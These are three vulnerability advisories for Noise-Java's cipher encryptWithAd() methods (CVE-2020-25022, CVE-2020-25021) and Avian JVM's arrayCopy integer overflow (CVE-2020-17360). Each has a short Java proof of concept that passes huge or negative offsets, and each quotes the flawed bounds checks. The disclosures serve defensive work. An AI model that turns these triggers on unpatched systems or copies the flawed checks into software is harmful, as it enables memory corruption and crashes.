Vulnerability title: Noise-Java AESGCMFallbackCipherState.encryptWithAd() insufficient boundary checks
Author: Pietro Oliva
CVE: CVE-2020-25022
Vendor: Rhys Weatherley (Creator of Noise Framework's reference implementation in Java)
Product: Noise-Java
Affected version: No version information is currently available.
Fixed version:    Check latest commit and pull request

Description:
The issue is located in the AESGCMFallbackCipherState.encryptWithAd() method
defined in AESGCMFallbackCipherState.java, where multiple boundary checks are
performed to prevent invalid length or offsets from being specified for the
encrypt or copy operation. However, some checks were found to be either
incomplete or missing, which would likely lead to the following scenarios:
- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
  or negative length (Depending on the underlying JVM's validation).
- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException

Impact:
Further checks might be implemented in the JVM and an exception might be thrown
before attempting any operation with invalid arguments.
If that is not the case, OOB read/write or a silent return on invalid arguments
might occur. This could in turn lead to arbitrary code execution in the context
of the JVM, memory disclosure, denial of service, or data loss.

Proof of concept:
Depending on the JVM, running the following code will result in either OOB read
(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:

package com.southernstorm.noise.protocol;

public class poc {

    public static void main(String[] args) {
        byte[] plaintext = "This is my plaintext".getBytes();
        byte[] ciphertext = new byte[plaintext.length];
        CipherState cs = new AESGCMFallbackCipherState();

        // Passing a large plaintextOffset should result in  a ShortBufferException
        //   instead of relying on the JMV's implementation of System.arraycopy.
        try {
                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
        }
        catch(Exception e){
                System.out.println("An exception has been thrown: " + e);
        }

    }
}

Evidence:

public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
        byte[] ciphertext, int ciphertextOffset, int length)
            throws ShortBufferException {
    int space;
    if (ciphertextOffset > ciphertext.length) // BUG: ciphertextOffset could be negative,
                                              // bypassing this length check
        space = 0;
    else
        space = ciphertext.length - ciphertextOffset;
        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it

    if (!haskey) {
        if (length > space) // BUG: this check can be bypassed with negative ciphertextOffset
            throw new ShortBufferException();
            if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)

            /* Multiple issues here:
            1. plaintextOffset is never checked. Depending on the JVM's implementation,
               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or
               exception being thrown.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB read/write or exception being thrown.
            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */

                System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
            return length;
        }
        if (space < 16 || length > (space - 16)) // BUG: this can be bypassed with negative length
            throw new ShortBufferException();
    setup(ad);

            /* Multiple issues here as well:
            1. plaintextOffset is never checked. this could result in an exception being thrown
               by the JVM.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
            3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy
               or exception being thrown. */

    encryptCTR(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
    ghash.update(ciphertext, ciphertextOffset, length);
    ghash.pad(ad != null ? ad.length : 0, length);
    ghash.finish(ciphertext, ciphertextOffset + length, 16);
    for (int index = 0; index < 16; ++index)
        ciphertext[ciphertextOffset + length + index] ^= hashKey[index];
    return length + 16;
}

As can be seen in the above code, multiple boundary checks are either missing
or incomplete, allowing for invalid length or offsets to be passed to the JVM's
implementation of System.arraycopy or other methods that handle encryption.
Depending on the JVM in use and how the missing/incomplete checks are exploited,
this could result in either OOB read/write, silent return, or exception thrown
by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
arbitrary code execution in the context of the JVM, or crash.

Mitigating factors:
Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and
CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
unhandled exception being thrown and/or crash of the JVM process.

# Noise-Java ChaChaPolyCipherState.encryptWithAd() insufficient boundary checks

Vulnerability title: Noise-Java ChaChaPolyCipherState.encryptWithAd() insufficient boundary checks
Author: Pietro Oliva
CVE: CVE-2020-25021
Vendor: Rhys Weatherley (Creator of Noise Framework's reference implementation in Java)
Product: Noise-Java
Affected version: No version information is currently available.
Fixed version:    Check latest commit and pull request

Description:
The issue is located in the ChaChaPolyCipherState.encryptWithAd() method
defined in ChaChaPolyCipherState.java, where multiple boundary checks are
performed to prevent invalid length or offsets from being specified for the
encrypt or copy operation. However, some checks were found to be either
incomplete or missing, which would likely lead to the following scenarios:
- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
  or negative length (Depending on the underlying JVM's validation).
- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException

Impact:
Further checks might be implemented in the JVM and an exception might be thrown
before attempting any operation with invalid arguments.
If that is not the case, OOB read/write or a silent return on invalid arguments
might occur. This could in turn lead to arbitrary code execution in the context
of the JVM, memory disclosure, denial of service, or data loss.

Proof of concept:
Depending on the JVM, running the following code will result in either OOB read
(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:

package com.southernstorm.noise.protocol;

public class poc {

    public static void main(String[] args) {
        byte[] plaintext = "This is my plaintext".getBytes();
        byte[] ciphertext = new byte[plaintext.length];
        CipherState cs = new ChaChaPolyCipherState();

        // Passing a large plaintextOffset should result in a ShortBufferException
        // instead of relying on the JMV's implementation of System.arraycopy.
        try {
                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
        }
        catch(Exception e){
                System.out.println("An exception has been thrown: " + e);
        }

    }
}

Evidence:

public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
        byte[] ciphertext, int ciphertextOffset, int length) throws ShortBufferException {
    int space;
    if (ciphertextOffset > ciphertext.length) // BUG: ciphertextOffset could be negative,
                                              // bypassing this length check
        space = 0;
    else
        space = ciphertext.length - ciphertextOffset;
        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it

    if (!haskey) {
        if (length > space) // BUG: this check can be bypassed with negative ciphertextOffset
            throw new ShortBufferException();
        if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)

            /* Multiple issues here:
            1. plaintextOffset is never checked. Depending on the JVM's implementation,
               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or
               exception being thrown.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB read/write or exception being thrown.
            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */

            System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
        return length;
    }
    if (space < 16 || length > (space - 16))
        throw new ShortBufferException();
    setup(ad);

    /* Multiple issues here as well:
        1. plaintextOffset is never checked. this could result in an exception being thrown
           by the JVM.
        2. ciphertextOffset could be negative, bypassing the checks on the length.
           Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
        3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy
           or exception being thrown. */

    encrypt(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
    poly.update(ciphertext, ciphertextOffset, length);
    finish(ad, length);
    System.arraycopy(polyKey, 0, ciphertext, ciphertextOffset + length, 16);
    return length + 16;
}

As can be seen in the above code, multiple boundary checks are either missing
or incomplete, allowing for invalid length or offsets to be passed to the JVM's
implementation of System.arraycopy or other methods that handle encryption.
Depending on the JVM in use and how the missing/incomplete checks are exploited,
this could result in either OOB read/write, silent return, or exception thrown
by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
arbitrary code execution in the context of the JVM, or crash.

Mitigating factors:
Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and
CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
unhandled exception being thrown and/or crash of the JVM process.

Vulnerability title: Avian JVM vm::arrayCopy() Multiple Integer Overflows
Author: Pietro Oliva
CVE: CVE-2020-17360
Vendor: ReadyTalk
Product: Avian JVM
Affected version: 1.2.0

Description:
The issue is located in the vm::arrayCopy method defined in classpath-common.h,
where multiple boundary checks are performed to prevent out-of-bounds memory
read/write. Two of those boundary checks contain an integer overflow which leads
to those same checks being bypassed and out-of-bounds read/write.

Impact:
Attackers could exploit this vulnerability to read/write arbitrary content in
the JVM memory. This could in turn result in denial of service, memory
disclosure, or arbitrary code execution in the context of the JVM.

Exploitation:
The following PoC would trigger an out-of-bounds write and crash of Avian JVM:

import java.lang.*;

public class poc {

    public static void main(String[] args) {
        byte[] src = "This is src".getBytes();
        byte[] dst = "This is dst".getBytes();

        // Triggering out-of-bounds write via integer overflow on System.arraycopy
        System.arraycopy(src, 0, dst, 0x7fffffff, 1);
    }
}

Evidence:

void arrayCopy(Thread* t,
               object src,
               int32_t srcOffset,
               object dst,
               int32_t dstOffset,
               int32_t length)
{
  if (LIKELY(src and dst)) {
    if (LIKELY(compatibleArrayTypes(
            t, objectClass(t, src), objectClass(t, dst)))) {
      unsigned elementSize = objectClass(t, src)->arrayElementSize();

      if (LIKELY(elementSize)) {
        intptr_t sl = fieldAtOffset<uintptr_t>(src, BytesPerWord);
        intptr_t dl = fieldAtOffset<uintptr_t>(dst, BytesPerWord);
        if (LIKELY(length > 0)) {
          if (LIKELY(srcOffset >= 0 and srcOffset + length <= sl // integer OF
/*integer overflow*/ and dstOffset >= 0 and dstOffset + length <= dl)) {
            uint8_t* sbody = &fieldAtOffset<uint8_t>(src, ArrayBody);
            uint8_t* dbody = &fieldAtOffset<uint8_t>(dst, ArrayBody);
            if (src == dst) {
              memmove(dbody + (dstOffset * elementSize),
                      sbody + (srcOffset * elementSize),
                      length * elementSize);
            } else {
              memcpy(dbody + (dstOffset * elementSize),
                     sbody + (srcOffset * elementSize),
                     length * elementSize);
            }

            if (objectClass(t, dst)->objectMask()) {
              mark(t, dst, ArrayBody + (dstOffset * BytesPerWord), length);
            }

            return;
          } else {
            throwNew(t, GcIndexOutOfBoundsException::Type);
          }
        } else {
          return;
        }
      }
    }
  } else {
    throwNew(t, GcNullPointerException::Type);
    return;
  }

  throwNew(t, GcArrayStoreException::Type);
}

As can be seen in the two lines commented above, offset+length can overflow and
the size checks would be bypassed. Overflowing srcOffset+length would trigger an
out-of-bounds read in either memmove or memcpy, while overflowing dstOffset +
length would trigger an out-of-bounds write in the same methods.

Mitigating factors:
Since both offsets and length need to be positive integers, there is a limited
range of memory where an attacker could read or write as a result of this
vulnerability.
